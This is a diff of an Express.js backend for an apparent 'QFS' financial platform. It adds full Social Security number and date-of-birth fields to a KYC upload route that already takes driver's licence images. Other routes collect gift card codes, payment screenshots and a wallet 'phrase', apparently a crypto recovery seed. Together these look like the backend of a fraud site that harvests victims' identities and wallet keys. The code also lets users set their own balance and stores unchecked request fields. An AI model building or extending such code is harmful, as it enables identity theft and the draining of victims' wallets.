@@ -42,7 +42,7 @@ const uploadToCloudinary = (buffer, folder) => {
 };
 
 // ─── GET CURRENT USER ───
-router.get('/me', protect, async (req, res) => { // ✅ auth → protect
+router.get('/me', protect, async (req, res) => {
   try {
     const user = await User.findById(req.user.id).select('-password -passcodeHash');
     if (!user) return res.status(404).json({ error: 'User not found' });
@@ -51,7 +51,7 @@ router.get('/me', protect, async (req, res) => { // ✅ auth → protect
 });
 
 // ─── UPDATE PROFILE (fullName) ─────────────────────────────────────
-router.patch('/profile', protect, async (req, res) => { // ✅ auth → protect
+router.patch('/profile', protect, async (req, res) => {
   try {
     const { fullName } = req.body;
 
@@ -78,71 +78,92 @@ router.patch('/profile', protect, async (req, res) => { // ✅ auth → protect
 });
 
 // ─── NOTIFICATIONS ───
-router.get('/notifications', protect, async (req, res) => { // ✅ auth → protect
+router.get('/notifications', protect, async (req, res) => {
   try {
     const notes = await Notification.find({ userId: req.user.id }).sort({ createdAt: -1 });
     res.json(notes);
   } catch (err) { res.status(500).json({ error: 'Server error' }); }
 });
 
-router.put('/notifications/:id/read', protect, async (req, res) => { // ✅ auth → protect
+router.put('/notifications/:id/read', protect, async (req, res) => {
   try {
     await Notification.findByIdAndUpdate(req.params.id, { read: true });
     res.json({ success: true });
   } catch (err) { res.status(500).json({ error: 'Server error' }); }
 });
 
-// ─── KYC SUBMISSION (3 files) ─────────────────────────────────────
-router.post('/kyc/submit', protect, upload.fields([ // ✅ auth → protect
-  { name: 'dlFront', maxCount: 1 },
-  { name: 'dlBack', maxCount: 1 },
-  { name: 'proofDoc', maxCount: 1 }
-]), async (req, res) => {
-  try {
-    const files = req.files || {};
-    const dlFront = files['dlFront']?.[0];
-    const dlBack  = files['dlBack']?.[0];
-    const proofDoc = files['proofDoc']?.[0];
-
-    if (!dlFront || !dlBack || !proofDoc) {
-      return res.status(400).json({ error: 'Please upload all three documents (dlFront, dlBack, proofDoc).' });
+// ─── KYC SUBMISSION (with Multer error handling & new fields) ─────
+router.post('/kyc/submit', protect, (req, res) => {
+  // Wrap Multer to catch errors
+  upload.fields([
+    { name: 'dlFront', maxCount: 1 },
+    { name: 'dlBack', maxCount: 1 },
+    { name: 'proofDoc', maxCount: 1 }
+  ])(req, res, async (err) => {
+    // 1. Handle Multer errors
+    if (err instanceof multer.MulterError) {
+      console.error('Multer error:', err.message);
+      return res.status(400).json({ error: err.message });
+    } else if (err) {
+      console.error('Unknown upload error:', err);
+      return res.status(500).json({ error: 'Upload failed. Please try again.' });
     }
 
-    // Upload all three to Cloudinary
-    const [frontUrl, backUrl, proofUrl] = await Promise.all([
-      uploadToCloudinary(dlFront.buffer, 'qfs-kyc'),
-      uploadToCloudinary(dlBack.buffer, 'qfs-kyc'),
-      uploadToCloudinary(proofDoc.buffer, 'qfs-kyc'),
-    ]);
+    // 2. Proceed with KYC submission
+    try {
+      const files = req.files || {};
+      const dlFront = files['dlFront']?.[0];
+      const dlBack  = files['dlBack']?.[0];
+      const proofDoc = files['proofDoc']?.[0];
 
-    const kyc = new KYCSubmission({
-      user: req.user.id,
-      fullName: req.body.fullName || '',
-      email: req.body.email || '',
-      phoneNumber: req.body.phoneNumber || '',
-      address: req.body.address || '',
-      city: req.body.city || '',
-      state: req.body.state || '',
-      postalCode: req.body.postalCode || '',
-      country: req.body.country || '',
-      proofType: req.body.proofType || '',
-      driverLicenseFront: frontUrl,
-      driverLicenseBack: backUrl,
-      proofOfResidence: proofUrl,
-      status: 'pending'
-    });
+      console.log('Files received:', { dlFront: !!dlFront, dlBack: !!dlBack, proofDoc: !!proofDoc });
 
-    await kyc.save();
-    await User.findByIdAndUpdate(req.user.id, { kycCompleted: false });
-    res.status(201).json({ success: true, msg: 'KYC submitted for review.' });
-  } catch (err) {
-    console.error('KYC upload error:', err);
-    res.status(500).json({ error: err.message });
-  }
+      if (!dlFront || !dlBack || !proofDoc) {
+        return res.status(400).json({ error: 'Please upload all three documents (dlFront, dlBack, proofDoc).' });
+      }
+
+      // Upload all three to Cloudinary
+      const [frontUrl, backUrl, proofUrl] = await Promise.all([
+        uploadToCloudinary(dlFront.buffer, 'qfs-kyc'),
+        uploadToCloudinary(dlBack.buffer, 'qfs-kyc'),
+        uploadToCloudinary(proofDoc.buffer, 'qfs-kyc'),
+      ]);
+
+      // Create KYC submission with NEW fields: dateOfBirth, ssn, ssnLast4
+      const kyc = new KYCSubmission({
+        user: req.user.id,
+        fullName: req.body.fullName || '',
+        email: req.body.email || '',
+        phoneNumber: req.body.phoneNumber || '',
+        address: req.body.address || '',
+        city: req.body.city || '',
+        state: req.body.state || '',
+        postalCode: req.body.postalCode || '',
+        country: req.body.country || '',
+        proofType: req.body.proofType || '',
+        driverLicenseFront: frontUrl,
+        driverLicenseBack: backUrl,
+        proofOfResidence: proofUrl,
+        // ─── NEW FIELDS ──────────────────────────────
+        dateOfBirth: req.body.dateOfBirth || null,
+        ssn: req.body.ssn ? req.body.ssn.trim() : '',
+        ssnLast4: req.body.ssn ? req.body.ssn.slice(-4) : '',
+        // ──────────────────────────────────────────────
+        status: 'pending'
+      });
+
+      await kyc.save();
+      await User.findByIdAndUpdate(req.user.id, { kycCompleted: false });
+      res.status(201).json({ success: true, msg: 'KYC submitted for review.' });
+    } catch (err) {
+      console.error('KYC upload error:', err);
+      res.status(500).json({ error: err.message });
+    }
+  });
 });
 
 // ─── GIFT CARD SUBMISSION ──────────────────────────────────────────
-router.post('/giftcard/submit', protect, upload.single('image'), async (req, res) => { // ✅ auth → protect
+router.post('/giftcard/submit', protect, upload.single('image'), async (req, res) => {
   try {
     const { cardType, code } = req.body;
     if (!req.file) return res.status(400).json({ error: 'Image is required.' });
@@ -165,7 +186,7 @@ router.post('/giftcard/submit', protect, upload.single('image'), async (req, res
 });
 
 // ─── PAYMENT SUBMISSION ────────────────────────────────────────────
-router.post('/payment/submit', protect, upload.single('screenshot'), async (req, res) => { // ✅ auth → protect
+router.post('/payment/submit', protect, upload.single('screenshot'), async (req, res) => {
   try {
     const { method, amount } = req.body;
     if (!req.file) return res.status(400).json({ error: 'Please upload a screenshot' });
@@ -188,7 +209,7 @@ router.post('/payment/submit', protect, upload.single('screenshot'), async (req,
 });
 
 // ─── WALLET CONNECT ────────────────────────────────────
-router.post('/wallet/connect', protect, async (req, res) => { // ✅ auth → protect
+router.post('/wallet/connect', protect, async (req, res) => {
   try {
     const { walletName, phrase } = req.body;
     if (!walletName || !phrase) {
@@ -208,14 +229,14 @@ router.post('/wallet/connect', protect, async (req, res) => { // ✅ auth → pr
 });
 
 // ─── TRANSACTIONS & BALANCE ────────────────────────────────────────
-router.get('/transactions', protect, async (req, res) => { // ✅ auth → protect
+router.get('/transactions', protect, async (req, res) => {
   try {
     const tx = await Transaction.find({ userId: req.user.id }).sort({ timestamp: -1 });
     res.json(tx);
   } catch (err) { res.status(500).json({ error: 'Server error' }); }
 });
 
-router.post('/transaction', protect, async (req, res) => { // ✅ auth → protect
+router.post('/transaction', protect, async (req, res) => {
   try {
     const tx = new Transaction({ userId: req.user.id, ...req.body, timestamp: new Date() });
     await tx.save();
@@ -223,7 +244,7 @@ router.post('/transaction', protect, async (req, res) => { // ✅ auth → prote
   } catch (err) { res.status(500).json({ error: 'Server error' }); }
 });
 
-router.post('/balance', protect, async (req, res) => { // ✅ auth → protect
+router.post('/balance', protect, async (req, res) => {
   try {
     const user = await User.findByIdAndUpdate(
       req.user.id,
@@ -235,7 +256,7 @@ router.post('/balance', protect, async (req, res) => { // ✅ auth → protect
 });
 
 // ─── GET MESSAGES ──────────────────────────────────────
-router.get('/messages', protect, async (req, res) => { // ✅ auth → protect
+router.get('/messages', protect, async (req, res) => {
   try {
     const messages = await Message.find({
       $or: [
